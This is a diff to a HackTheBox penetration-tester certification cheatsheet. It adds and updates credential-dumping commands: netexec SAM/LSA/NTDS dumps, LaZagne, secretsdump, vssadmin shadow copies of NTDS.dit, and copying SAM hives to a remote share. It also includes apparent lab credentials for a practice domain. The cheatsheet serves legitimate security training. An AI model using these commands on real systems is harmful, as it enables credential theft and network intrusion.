@@ -33,9 +33,9 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Transferring Files with Code](#transferring-files-with-code)
 - [Password Attacks](#password-attacks)
     - [Password Mutations](#password-mutations)
-    - [Remote Password Attacks](#remote-password-attacks)
-    - [Windows Password Attacks](#windows-password-attacks)
-    - [Linux Password Attacks](#linux-password-attacks)
+    - [Remote Password Attacks](#remote-local-password-attacks)
+    - [Windows Local Password Attacks](#windows-local-password-attacks)
+    - [Linux Local Password Attacks](#linux-password-attacks)
     - [Cracking Passwords](#cracking-passwords)
 - [Attacking Common Services](#attacking-common-services)
     - [Attacking SMB](#attacking-smb)
@@ -461,17 +461,20 @@ hydra -L user.list -P password.list <service>://<ip>
 # Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.
 hydra -C <user_pass.list> ssh://<IP>
 
-# Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.
-crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam
+# Uses netexec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. ( need priv LOCAL ADMIN to dump SAM ) 
+netexec smb <ip> --local-auth -u <username> -p <password> --sam
 
-# Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.
-crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa
+# Uses netexec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. ( need priv LOCAL ADMIN to dump LSA secrets ) 
+netexec smb <ip> --local-auth -u <username> -p <password> --lsa
 
-# Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.
-crackmapexec smb <ip> -u <username> -p <password> --ntds
+# Uses netexec in conjunction with admin credentials to dump hashes from the ntds file over a network.( need priv DOMAIN ADMIN to dump NTDS.dit) 
+netexec smb <ip> -u <username> -p <password> --ntds
 ```
-##### Windows Password Attacks
+##### Windows Local Password Attacks
 ```
+# Uses LaZagne tool to discover credentials that web browsers or other installed applications may insecurely store.
+start LaZagne.exe all
+
 # Uses Windows command-line based utility findstr to search for the string "password" in many different file type.
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 
@@ -490,10 +493,21 @@ reg.exe save hklm\sam C:\sam.save
 # Uses move in Windows to transfer a file to a specified file share over the network.
 move sam.save \\<ip>\NameofFileShare
 
+# Uses Secretsdump.py to dump password hashes from the SAM database.
+python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+( Next dump NTDS.dit need privilege Domain Admin)
+
+# Uses Windows command line based tool vssadmin to create a volume shadow copy for C:. This can be used to make a copy of NTDS.dit safely.
+vssadmin CREATE SHADOW /For=C:
+
 # Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.
 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+# Uses impacket-secretsdump to dump password hashes from the NTDS.dit by using 2 file NTDS.dit , system.save 
+impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
 ```
-##### Linux Password Attacks
+##### Linux Local Password Attacks
 ```
 # Script that can be used to find .conf, .config and .cnf files on a Linux system.
 for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done
@@ -1038,6 +1052,14 @@ netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --gmsa
 netexec.py ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k -M tombstone -o ACTION=query
 netexec.py ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k -M tombstone -o ACTION=restore ID=1c6b1deb-c372-4cbb-87b1-15031de169db SCHEME=ldap
 
+# Uses netexec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. ( need priv LOCAL ADMIN to dump SAM ) 
+netexec smb <ip> --local-auth -u <username> -p <password> --sam
+
+# Uses netexec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. ( need priv LOCAL ADMIN to dump LSA secrets ) 
+netexec smb <ip> --local-auth -u <username> -p <password> --lsa
+
+# Uses netexec in conjunction with admin credentials to dump hashes from the ntds file over a network.( need priv DOMAIN ADMIN to dump NTDS.dit) 
+netexec smb <ip> -u <username> -p <password> --ntds
 
 
 ```
